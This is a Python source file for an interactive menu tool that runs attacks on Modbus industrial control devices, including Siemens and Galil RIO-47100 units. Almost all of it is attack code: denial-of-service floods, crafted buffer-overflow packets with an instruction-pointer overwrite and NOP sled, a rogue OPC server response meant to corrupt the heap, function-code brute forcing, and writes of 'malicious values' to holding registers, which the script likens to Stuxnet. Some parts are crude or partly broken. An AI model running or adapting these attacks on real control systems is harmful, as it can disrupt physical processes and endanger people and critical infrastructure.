import socket
import struct
from pymodbus.client import ModbusTcpClient
from pymodbus.exceptions import ModbusException, ConnectionException
from colorama import Fore, init, Style
from prettytable import PrettyTable
import signal

# Initialize colorama
init(autoreset=True)


# Custom exception for graceful exit
class GracefulExitException(Exception):
    pass


# Modbus Slave DoS exploit
def modbus_slave_dos():
    print("Description: This exploit sends a large payload to cause a Denial of Service (DoS) on a Modbus slave device.")
    exploit = 'A' * 736
    try:
        with open("Modbus.txt", "w") as file:
            file.write(exploit)
        print(Fore.GREEN + "POC is created")
    except Exception as e:
        print(Fore.RED + f"POC not created: {e}")


# Siemens Device Buffer Overflow exploit
def siemens_device_buffer_overflow():
    print("Description: This exploit sends a payload to cause a buffer overflow on Siemens devices.")
    buffer = "A" * 603
    try:
        with open("siemens_exploit.txt", "w") as f:
            print(Fore.GREEN + f"[+] Creating {len(buffer)} bytes evil payload..")
            f.write(buffer)
        print(Fore.GREEN + "[+] File created!")
    except Exception as e:
        print(Fore.RED + f"File cannot be created: {e}")


# Modbus Slave Registration Key DoS exploit
def modbus_slave_registration_key_dos():
    print("Description: This exploit sends a large payload to cause a Denial of Service (DoS) on a Modbus slave registration key.")
    buffer = "A" * 4000
    try:
        with open("registration_key_exploit.txt", "w") as f:
            print(Fore.GREEN + f"[+] Creating {len(buffer)} bytes evil payload..")
            f.write(buffer)
        print(Fore.GREEN + "[+] File created!")
    except Exception as e:
        print(Fore.RED + f"File cannot be created: {e}")


# Buffer Overflow Variant 1 exploit
def buffer_overflow_variant1(ip, port):
    print("Description: This exploit sends a specially crafted packet to cause a buffer overflow on Modbus devices.")
    con = (ip, port)
    message_header = "\x00\x64"
    message_buffer = "A" * 0x5dc
    eip = struct.pack("<I", 0x7C9C167D)  # Adjust address as needed

    nopsleed = "\x90" * 100
    shellcode = b"\x90" * 300  # Placeholder for actual shellcode

    message = message_header + message_buffer + eip + nopsleed + shellcode.decode('latin-1')
    print(Fore.GREEN + f"Message Length: {hex(len(message))} bytes")

    header_padding = "\x42\x42"
    header_buf_size = "\xFF\xFF"
    header_recv_len = struct.pack(">H", len(message))
    header_end = "\x44"

    header = header_padding + header_buf_size + header_recv_len + header_end
    payload = header + message
    print(Fore.GREEN + f"Package Length: {hex(len(payload))} bytes")

    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.connect(con)
    s.send(payload.encode('latin-1'))
    s.close()


# Buffer Overflow Variant 2 exploit
def buffer_overflow_variant2(ip, port):
    print("Description: This exploit sends a specially crafted packet to cause a buffer overflow on Modbus devices (Variant 2).")
    con = (ip, port)
    header_padding = "\x00\xAA"
    header_buffer_size = "\xFF\xFF"
    header_recv_len = "\x08\xDD"
    header_end = "\xFF"

    header = header_padding + header_buffer_size + header_recv_len + header_end
    message = "\x00\x64" + "A" * 2267

    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.connect(con)
    s.send(header.encode('latin-1'))
    s.send(message.encode('latin-1'))
    s.close()


# Galil RIO-47100 DoS exploit
def galil_rio_47100_dos(ip, port):
    print("Description: This exploit sends a large number of requests to cause a Denial of Service (DoS) on Galil RIO-47100 devices.")
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.connect((ip, port))
    s.send(b'\x00\x01\x00\x00\x00\x06\x01\x01\x00\x00\x00\x01' * 100)
    s.close()
    print(Fore.GREEN + "DoS attack on Galil RIO-47100 executed successfully")


# Modbus OPC Heap Corruption exploit
def modbus_opc_heap_corruption():
    print("Description: This exploit sends a packet to cause heap corruption on Modbus OPC servers.")
    port = 502
    resp = b"\x00\x00\x00\x00\x00\x06\xff\x2b\x0e\x03\x00"

    try:
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        sock.bind(("", port))
        sock.listen(1)
        conn, addr = sock.accept()
        print(Fore.GREEN + f"OPC server at {addr[0]} connected")

        req = conn.recv(32)
        print(Fore.CYAN + f"<-- {req.hex()}")

        conn.send(resp)
        print(Fore.CYAN + f"--> {resp.hex()}")
        conn.close()
        print(Fore.GREEN + "Heap corruption exploit finished, check server")
    except Exception as e:
        print(Fore.RED + f"Failed to execute heap corruption exploit: {e}")


# Heap Overflow Exploit
def heap_overflow_exploit(ip, port):
    print("Description: This exploit sends a packet to cause a heap overflow on Modbus devices.")
    payload = b'\x00\x00\x00\x00\x00\x06\xff\x2b\x0e\x03\x00'

    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    sock.connect((ip, port))
    sock.send(payload)

    response = sock.recv(1024)
    print("Response:", response.hex())
    sock.close()


# Brute Force Function Codes
def brute_force_function_codes(ip, port, unit_id):
    print("Description: This exploit attempts to brute-force all possible function codes on a Modbus device.")
    client = ModbusTcpClient(ip, port=port)
    client.connect()
    table = PrettyTable(["Function Code", "Status"])

    function_codes = range(1, 256)  # Brute force all possible function codes

    for function_code in function_codes:
        try:
            request = client.execute(client.framer.buildRequest(function_code, unit_id))
            if request.isError():
                table.add_row([function_code, Fore.RED + "Error"])
            else:
                table.add_row([function_code, Fore.GREEN + "Success"])
        except ModbusException as e:
            table.add_row([function_code, Fore.RED + f"ModbusException: {str(e)}"])
        except Exception as e:
            table.add_row([function_code, Fore.RED + f"Failed: {str(e)}"])
    client.close()
    print(Fore.CYAN + table.get_string())


# Sand Crafting Exploit (Stuxnet-like)
def sand_crafting_exploit(ip, port, unit_id):
    print("Description: This exploit alters the values of holding registers to manipulate device behavior in a manner similar to the Stuxnet attack.")
    client = ModbusTcpClient(ip, port=port)
    client.connect()

    # Example: Altering the values of holding registers to manipulate device behavior
    target_registers = [40001, 40002, 40003]  # Adjust based on your target device
    malicious_values = [1234, 5678, 91011]

    for reg, val in zip(target_registers, malicious_values):
        try:
            client.write_register(reg, val, unit=unit_id)
            print(Fore.GREEN + f"Successfully wrote {val} to register {reg}")
        except ModbusException as e:
            print(Fore.RED + f"ModbusException: {e}")
        except Exception as e:
            print(Fore.RED + f"Failed to write to register {reg}: {e}")

    client.close()


# Run exploits with interactive menu
def run_exploits(ip, port, unit):
    print(Fore.YELLOW + "Running exploits...")
    try:
        while True:
            print("\nSelect an exploit to run:")
            print("1. Modbus Slave DoS")
            print("2. Siemens Device Buffer Overflow")
            print("3. Modbus Slave Registration Key DoS")
            print("4. Buffer Overflow Variant 1")
            print("5. Buffer Overflow Variant 2")
            print("6. Galil RIO-47100 DoS")
            print("7. Modbus OPC Heap Corruption")
            print("8. Heap Overflow Exploit")
            print("9. Brute Force Function Codes")
            print("10. Sand Crafting Exploit")
            print("11. Return to Main Menu")
            print("12. Exit")

            choice = input("Enter your choice: ").strip()

            if choice == '1':
                modbus_slave_dos()
            elif choice == '2':
                siemens_device_buffer_overflow()
            elif choice == '3':
                modbus_slave_registration_key_dos()
            elif choice == '4':
                buffer_overflow_variant1(ip, port)
            elif choice == '5':
                buffer_overflow_variant2(ip, port)
            elif choice == '6':
                galil_rio_47100_dos(ip, port)
            elif choice == '7':
                modbus_opc_heap_corruption()
            elif choice == '8':
                heap_overflow_exploit(ip, port)
            elif choice == '9':
                brute_force_function_codes(ip, port, unit)
            elif choice == '10':
                sand_crafting_exploit(ip, port, unit)
            elif choice == '11':
                break
            elif choice == '12':
                print("Exiting program.")
                exit(0)
            else:
                print(Fore.RED + "Invalid choice. Please select a valid option.")
    except GracefulExitException:
        print(Fore.YELLOW + "Exiting exploit menu.")
    except Exception as e:
        print(Fore.RED + f"Unexpected error: {e}")


def signal_handler(signal, frame):
    raise GracefulExitException()


if __name__ == "__main__":
    import argparse
    import signal

    signal.signal(signal.SIGINT, signal_handler)

    parser = argparse.ArgumentParser(description="Modbus Exploits Script")
    parser.add_argument('--ip', type=str, help="Modbus device IP address", required=True)
    parser.add_argument('--port', type=int, help="Modbus device port (default: 502)", default=502)
    parser.add_argument('--unit', type=int, help="Modbus device unit ID (default: 1)", default=1)
    args = parser.parse_args()

    run_exploits(args.ip, args.port, args.unit)
